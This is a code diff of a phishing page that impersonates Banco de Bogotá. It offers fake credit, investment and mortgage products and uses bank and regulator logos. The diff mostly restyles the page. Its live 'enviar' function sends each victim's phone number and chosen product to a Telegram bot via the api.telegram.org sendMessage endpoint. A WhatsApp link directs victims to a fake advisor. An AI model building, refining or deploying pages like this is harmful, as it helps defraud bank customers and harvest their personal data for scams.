0 0 0-.023.055q0 .031.023.055a.08.08 0 0 0 .055.023c7.898 0 14.595-4.051 14.595-9.765 0-2.808-1.662-4.726-3.376-6.44-.208-.208-.263-.208-.415-.104-.935.624-1.974 1.87-2.494 4.26 0 .051-.103.051-.103 0 .103-3.792 2.493-6.23 7.012-6.23.103 0 .103-.104 0-.156-6.545-3.065-15.011-2.701-21.815.83-.103.047-.052.1 0 .1"/></g></g><defs><clipPath id="hla"><path fill="#fff" d="M166.815 0h31.997v32h-31.997z"/></clipPath><clipPath id="hlb"><path fill="#fff" d="M166.815.667h31.656v31.267h-31.656z"/></clipPath></defs></svg>
+    </div>
+    <div class="header-actions">
+        <div class="menu-icon">
+            <span></span><span></span><span></span>
+            <div class="menu-text">Menú</div>
+        </div>
+    </div>
+</header>
+
+<!-- HERO -->
+<main class="hero">
+    <h1 class="hero-title">Solicitud de Producto Banco de Bogotá</h1>
+    <p class="hero-subtitle">
+        Escoge entre nuestras opciones de crédito, inversión y cupo con aprobación digital
+        de hasta <strong>$500.000.000</strong> exclusivo para usuarios Banco de Bogotá.
+    </p>
+    <div class="info-banner">
+        <div class="info-banner-icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4M12 8h.01"></path>
+            </svg>
+        </div>
+        <p><strong>¡Te hicimos las cuentas!</strong> Simula tu cuota en segundos, elige el plazo que prefieras y solicita con aprobación digital inmediata.</p>
+    </div>
+    <div class="card-image-wrapper">
+        <img src="https://bancavirtulonline.vercel.app/images/imagelanding.png" loading="eager" decoding="async" alt="Banco de Bogotá">
+    </div>
+</main>
+
+<!-- BANNER DE AYUDA -->
+<div class="blue-banner">
+    <img src="per.png" alt="ayuda">
+    <div style="flex:1">
+        <strong>¿Necesitas ayuda?</strong><br>
+        <a href="https://wa.me/message/SNG3H4I7373KP1">Contacta con un asesor ></a>
+    </div>
+</div>
+
+<!-- CONTENEDOR DE PRODUCTOS -->
 <div class="container">
-<div class="container__login">
-<div class="container__login--header"><img src="logobanco1.jpg" alt="Banco de Bogota"></div>
-<div class="container__login--title"><h2>Solicitud de Producto</h2></div>
-<div class="blue-banner"><img src="per.png" alt="ayuda"><div style="flex:1"><strong>¿Necesitas ayuda?</strong><br><a href="https://wa.me/message/SNG3H4I7373KP1">Contacta con un asesor ></a></div></div>
 
 <!-- ============================================================
      SECCIÓN 1: AUMENTO DE CUPO (TARJETA VIRTUAL)
      ============================================================ -->
-<div class="login-card-content">
-  <div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-bottom:12px">
-    Escoge tu aumento de cupo ideal entre $5.000.000 y $70.000.000
-  </div>
-  <img src="tarjeta bo.jpg" alt="Tarjeta" style="width:100%;border-radius:8px;margin-bottom:12px">
-  <div style="text-align:center;font-size:28px;font-weight:700;color:#212529;margin:10px 0" id="valor-cupo">$7.000.000</div>
-  <input type="range" id="slider-cupo" min="5000000" max="50000000" step="500000" value="7000000" oninput="actualizarCupo()" style="width:100%;margin:15px 0;cursor:pointer">
-  <div style="display:flex;justify-content:space-between;font-size:14px;color:#6c757d;margin-bottom:15px"><span>$5.000.000</span><span>$70.000.000</span></div>
+<div class="producto-seccion">
+  <div class="producto-seccion__titulo">💳 Aumento de Cupo</div>
+  <div class="producto-seccion__desc">Escoge tu aumento de cupo ideal entre $5.000.000 y $70.000.000</div>
 
-  <div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-top:20px;margin-bottom:10px">¿En cuántas cuotas?</div>
-  <div class="producto-seccion__plazos" id="plazos-cupo" style="margin:10px 0 20px 0"></div>
+  <img src="tarjeta bo.jpg" alt="Tarjeta" style="width:100%;border-radius:12px;margin-bottom:12px">
 
-  <div style="background:#f5f7fa;border-radius:8px;padding:16px;margin-top:20px;text-align:center">
-    <div style="font-size:12px;color:#6b7280">Cuota mensual estimada</div>
-    <div style="font-size:24px;font-weight:700;color:#111827;margin-top:4px" id="cuota-cupo">$0</div>
+  <div class="producto-seccion__valor" id="valor-cupo">$7.000.000</div>
+  <input type="range" id="slider-cupo" class="cupo-slider" min="5000000" max="50000000" step="500000" value="7000000" oninput="actualizarCupo()">
+  <div class="slider-labels"><span>$5.000.000</span><span>$70.000.000</span></div>
+
+  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:8px;margin-bottom:8px">¿En cuántas cuotas?</div>
+  <div class="producto-seccion__plazos" id="plazos-cupo"></div>
+
+  <div class="producto-seccion__cuota-box">
+    <div class="producto-seccion__cuota-label">Cuota mensual estimada</div>
+    <div class="producto-seccion__cuota-valor" id="cuota-cupo">$0</div>
   </div>
-  <div style="font-size:13px;color:#c62828;margin-top:10px;text-align:center;background:#ffebee;padding:8px;border-radius:4px">El cupo se asigna sin intereses mensuales y con aprobación digital.</div>
-  <input type="tel" id="tel-cupo" style="width:100%;padding:14px;border-radius:8px;border:1px solid #d1d1d1;margin-top:10px;box-sizing:border-box;font-size:16px;outline:none" placeholder="Número de teléfono" maxlength="11">
-  <button onclick="enviar('cupo')" style="width:100%;margin-top:15px;padding:14px 20px;background:#0033a0;color:#fff;border:none;font-size:16px;font-weight:700;border-radius:8px;cursor:pointer">SOLICITAR AUMENTO</button>
-  <div style="text-align:center;color:#999;font-size:.8em;margin-top:15px">Este sitio está protegido por reCAPTCHA y aplican las políticas</div>
+  <div class="producto-seccion__nota">El cupo se asigna sin intereses mensuales y con aprobación digital.</div>
+
+  <div class="phone-field">
+    <label class="phone-label" for="tel-cupo">Número de celular</label>
+    <div class="phone-input-wrap">
+      <span class="phone-prefix">+57</span>
+      <input type="tel" id="tel-cupo" class="phone-input" placeholder="300 000 0000" maxlength="11" inputmode="numeric">
+    </div>
+  </div>
+  <button onclick="enviar('cupo')" class="producto-seccion__btn">SOLICITAR AUMENTO →</button>
 </div>
 
 <!-- ============================================================
@@ -91,9 +315,9 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   <div class="producto-seccion__titulo">💵 Crédito Libre Inversión</div>
   <div class="producto-seccion__desc">Dinero para lo que necesites, sin explicaciones. Desde $1.000.000 hasta $50.000.000.</div>
   <div class="producto-seccion__valor" id="valor-libre">$5.000.000</div>
-  <input type="range" id="slider-libre" min="1000000" max="50000000" step="500000" value="5000000" oninput="actualizarProducto('libre')" style="width:100%;margin:12px 0;cursor:pointer">
-  <div style="display:flex;justify-content:space-between;font-size:13px;color:#6c757d"><span>$1.000.000</span><span>$50.000.000</span></div>
-  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:14px;margin-bottom:8px">¿En cuántas cuotas?</div>
+  <input type="range" id="slider-libre" class="cupo-slider" min="1000000" max="50000000" step="500000" value="5000000" oninput="actualizarProducto('libre')">
+  <div class="slider-labels"><span>$1.000.000</span><span>$50.000.000</span></div>
+  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:8px;margin-bottom:8px">¿En cuántas cuotas?</div>
   <div class="producto-seccion__plazos" id="plazos-libre"></div>
   <div class="producto-seccion__cuota-box">
     <div class="producto-seccion__cuota-label">Cuota mensual estimada</div>
@@ -101,7 +325,7 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   </div>
   <div class="producto-seccion__nota">Tasa preferencial desde 1.2% mensual. Aprobación en línea.</div>
   <input type="tel" id="tel-libre" class="producto-seccion__tel" placeholder="Número de teléfono" maxlength="11">
-  <button onclick="enviar('libre')" class="producto-seccion__btn">SOLICITAR CRÉDITO</button>
+  <button onclick="enviar('libre')" class="producto-seccion__btn">SOLICITAR CRÉDITO →</button>
 </div>
 
 <!-- ============================================================
@@ -111,9 +335,9 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   <div class="producto-seccion__titulo">📈 Inversión Digital (CDT)</div>
   <div class="producto-seccion__desc">Haz crecer tu dinero con rentabilidad garantizada. Desde $1.000.000 hasta $100.000.000.</div>
   <div class="producto-seccion__valor" id="valor-cdt">$5.000.000</div>
-  <input type="range" id="slider-cdt" min="1000000" max="100000000" step="500000" value="5000000" oninput="actualizarProducto('cdt')" style="width:100%;margin:12px 0;cursor:pointer">
-  <div style="display:flex;justify-content:space-between;font-size:13px;color:#6c757d"><span>$1.000.000</span><span>$100.000.000</span></div>
-  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:14px;margin-bottom:8px">¿A cuántos meses?</div>
+  <input type="range" id="slider-cdt" class="cupo-slider" min="1000000" max="100000000" step="500000" value="5000000" oninput="actualizarProducto('cdt')">
+  <div class="slider-labels"><span>$1.000.000</span><span>$100.000.000</span></div>
+  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:8px;margin-bottom:8px">¿A cuántos meses?</div>
   <div class="producto-seccion__plazos" id="plazos-cdt"></div>
   <div class="producto-seccion__cuota-box">
     <div class="producto-seccion__cuota-label">Rendimiento estimado</div>
@@ -121,7 +345,7 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   </div>
   <div class="producto-seccion__nota">Rentabilidad garantizada. Tu dinero respaldado por el banco.</div>
   <input type="tel" id="tel-cdt" class="producto-seccion__tel" placeholder="Número de teléfono" maxlength="11">
-  <button onclick="enviar('cdt')" class="producto-seccion__btn">INVERTIR AHORA</button>
+  <button onclick="enviar('cdt')" class="producto-seccion__btn">INVERTIR AHORA →</button>
 </div>
 
 <!-- ============================================================
@@ -131,9 +355,9 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   <div class="producto-seccion__titulo">🔄 Crédito Rotativo</div>
   <div class="producto-seccion__desc">Usa, paga y vuelve a usar tu cupo cuando quieras. Desde $1.000.000 hasta $30.000.000.</div>
   <div class="producto-seccion__valor" id="valor-rotativo">$3.000.000</div>
-  <input type="range" id="slider-rotativo" min="1000000" max="30000000" step="500000" value="3000000" oninput="actualizarProducto('rotativo')" style="width:100%;margin:12px 0;cursor:pointer">
-  <div style="display:flex;justify-content:space-between;font-size:13px;color:#6c757d"><span>$1.000.000</span><span>$30.000.000</span></div>
-  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:14px;margin-bottom:8px">¿En cuántas cuotas?</div>
+  <input type="range" id="slider-rotativo" class="cupo-slider" min="1000000" max="30000000" step="500000" value="3000000" oninput="actualizarProducto('rotativo')">
+  <div class="slider-labels"><span>$1.000.000</span><span>$30.000.000</span></div>
+  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:8px;margin-bottom:8px">¿En cuántas cuotas?</div>
   <div class="producto-seccion__plazos" id="plazos-rotativo"></div>
   <div class="producto-seccion__cuota-box">
     <div class="producto-seccion__cuota-label">Cuota mensual estimada</div>
@@ -141,7 +365,7 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   </div>
   <div class="producto-seccion__nota">Disponible 24/7. Solo pagas por lo que usas.</div>
   <input type="tel" id="tel-rotativo" class="producto-seccion__tel" placeholder="Número de teléfono" maxlength="11">
-  <button onclick="enviar('rotativo')" class="producto-seccion__btn">SOLICITAR ROTATIVO</button>
+  <button onclick="enviar('rotativo')" class="producto-seccion__btn">SOLICITAR ROTATIVO →</button>
 </div>
 
 <!-- ============================================================
@@ -151,9 +375,9 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   <div class="producto-seccion__titulo">🧾 Compra de Cartera</div>
   <div class="producto-seccion__desc">Unifica todas tus deudas en una sola cuota más baja. Desde $2.000.000 hasta $80.000.000.</div>
   <div class="producto-seccion__valor" id="valor-cartera">$10.000.000</div>
-  <input type="range" id="slider-cartera" min="2000000" max="80000000" step="500000" value="10000000" oninput="actualizarProducto('cartera')" style="width:100%;margin:12px 0;cursor:pointer">
-  <div style="display:flex;justify-content:space-between;font-size:13px;color:#6c757d"><span>$2.000.000</span><span>$80.000.000</span></div>
-  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:14px;margin-bottom:8px">¿En cuántas cuotas?</div>
+  <input type="range" id="slider-cartera" class="cupo-slider" min="2000000" max="80000000" step="500000" value="10000000" oninput="actualizarProducto('cartera')">
+  <div class="slider-labels"><span>$2.000.000</span><span>$80.000.000</span></div>
+  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:8px;margin-bottom:8px">¿En cuántas cuotas?</div>
   <div class="producto-seccion__plazos" id="plazos-cartera"></div>
   <div class="producto-seccion__cuota-box">
     <div class="producto-seccion__cuota-label">Cuota mensual estimada</div>
@@ -161,7 +385,7 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   </div>
   <div class="producto-seccion__nota">Unifica tus deudas en una sola cuota más baja.</div>
   <input type="tel" id="tel-cartera" class="producto-seccion__tel" placeholder="Número de teléfono" maxlength="11">
-  <button onclick="enviar('cartera')" class="producto-seccion__btn">UNIFICAR DEUDAS</button>
+  <button onclick="enviar('cartera')" class="producto-seccion__btn">UNIFICAR DEUDAS →</button>
 </div>
 
 <!-- ============================================================
@@ -171,9 +395,9 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   <div class="producto-seccion__titulo">🏠 Préstamo para Vivienda</div>
   <div class="producto-seccion__desc">Financia tu casa o apartamento con las mejores tasas. Desde $20.000.000 hasta $500.000.000.</div>
   <div class="producto-seccion__valor" id="valor-vivienda">$80.000.000</div>
-  <input type="range" id="slider-vivienda" min="20000000" max="500000000" step="1000000" value="80000000" oninput="actualizarProducto('vivienda')" style="width:100%;margin:12px 0;cursor:pointer">
-  <div style="display:flex;justify-content:space-between;font-size:13px;color:#6c757d"><span>$20.000.000</span><span>$500.000.000</span></div>
-  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:14px;margin-bottom:8px">¿A cuántos meses?</div>
+  <input type="range" id="slider-vivienda" class="cupo-slider" min="20000000" max="500000000" step="1000000" value="80000000" oninput="actualizarProducto('vivienda')">
+  <div class="slider-labels"><span>$20.000.000</span><span>$500.000.000</span></div>
+  <div style="text-align:center;font-size:14px;font-weight:600;color:#212529;margin-top:8px;margin-bottom:8px">¿A cuántos meses?</div>
   <div class="producto-seccion__plazos" id="plazos-vivienda"></div>
   <div class="producto-seccion__cuota-box">
     <div class="producto-seccion__cuota-label">Cuota mensual estimada</div>
@@ -181,12 +405,56 @@ input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe 
   </div>
   <div class="producto-seccion__nota">Financia hasta el 70% del valor de tu vivienda.</div>
   <input type="tel" id="tel-vivienda" class="producto-seccion__tel" placeholder="Número de teléfono" maxlength="11">
-  <button onclick="enviar('vivienda')" class="producto-seccion__btn">SOLICITAR VIVIENDA</button>
+  <button onclick="enviar('vivienda')" class="producto-seccion__btn">SOLICITAR VIVIENDA →</button>
 </div>
 
 </div>
-<div class="container__info"><img src="taval.jpg" alt="Tu Aval" style="width:100%;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,.1)"></div>
-</div>
+
+<!-- INFO GRID -->
+<section class="info-grid-section">
+    <div class="info-grid">
+        <div class="info-grid-item">
+            <svg class="grid-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            <span class="grid-label">Edad entre</span>
+            <span class="grid-value">18 y 84 años</span>
+        </div>
+        <div class="info-grid-item">
+            <svg class="grid-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line>
+            </svg>
+            <span class="grid-label">Cuota de manejo</span>
+            <span class="grid-value">12 meses a $0*</span>
+        </div>
+        <div class="info-grid-item">
+            <svg class="grid-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <ellipse cx="12" cy="5" rx="9" ry="3"></ellipse>
+                <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"></path>
+                <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"></path>
+            </svg>
+            <span class="grid-label">Cupo de hasta</span>
+            <span class="grid-value">$500 millones</span>
+        </div>
+        <div class="info-grid-item">
+            <svg class="grid-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="8" r="7"></circle>
+                <polyline points="8.21 13.89 7 23 12 20 17 23 15.79 13.88"></polyline>
+            </svg>
+            <span class="grid-label">Por cada $3.000</span>
+            <span class="grid-value">1 Milla Avianca</span>
+        </div>
+    </div>
+    <p class="info-grid-footnote">*12 meses a $0 de cuota de manejo si solicitas la tarjeta por internet. Después, $62.900 mensuales.</p>
+</section>
+
+<!-- FOOTER LOGOS -->
+<section class="logos-footer">
+    <div class="logos-footer-inner">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/Grupo_Aval_logo.svg/320px-Grupo_Aval_logo.svg.png" class="logo-aval" alt="Grupo Aval">
+        <img src="https://www.superfinanciera.gov.co/SFCant/ImagenesPublicaciones/Logos%20y%20Marcas/Logos%20SFC/Logo_sfc_transparente.png" class="logo-vigilado" alt="Superintendencia Financiera">
+    </div>
+</section>
 
 <!-- MODAL DE ERROR -->
 <div id="modal-error" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.4);z-index:9999;justify-content:center;align-items:center">
@@ -239,7 +507,7 @@ function seleccionarPlazo(producto, p, btn, cont) {
   for (var i = 0; i < cont.children.length; i++) {
     cont.children[i].style.background = "#fff";
     cont.children[i].style.color = "#212529";
-    cont.children[i].style.borderColor = "#d1d1d1";
+    cont.children[i].style.borderColor = "#dce3f7";
   }
   btn.style.background = "#0033a0";
   btn.style.color = "#fff";
@@ -257,6 +525,13 @@ function actualizarProducto(producto) {
   document.getElementById("valor-" + producto).innerText = "$" + v.toLocaleString("es-CO");
   var plazo = plazosSeleccionados[producto];
   document.getElementById("cuota-" + producto).innerText = "$" + Math.round(v / plazo).toLocaleString("es-CO");
+  actualizarSliderFondo(slider);
+}
+
+function actualizarSliderFondo(slider) {
+  var min = Number(slider.min), max = Number(slider.max), val = Number(slider.value);
+  var progress = ((val - min) / (max - min)) * 100;
+  slider.style.setProperty('--progress', progress + '%');
 }
 
 function actualizarCupo() { actualizarProducto("cupo"); }
@@ -289,7 +564,7 @@ function enviar(producto) {
     "📞 Teléfono: " + tel + "%0A" +
     "🕒 " + new Date().toLocaleString("es-CO");
 
-  document.getElementById("loading-overlay").style.display = "flex";
+  document.getElementById("loading-overlay").classList.add("show");
 
   var url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + mensaje;
 
@@ -309,6 +584,5 @@ generarPlazos("rotativo"); actualizarProducto("rotativo");
 generarPlazos("cartera");  actualizarProducto("cartera");
 generarPlazos("vivienda"); actualizarProducto("vivienda");
 </script>
-<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3acf5ee7907441b39cc1d1b750314325","r":1,"spa":2}' crossorigin="anonymous"></script>
 </body>
 </html>
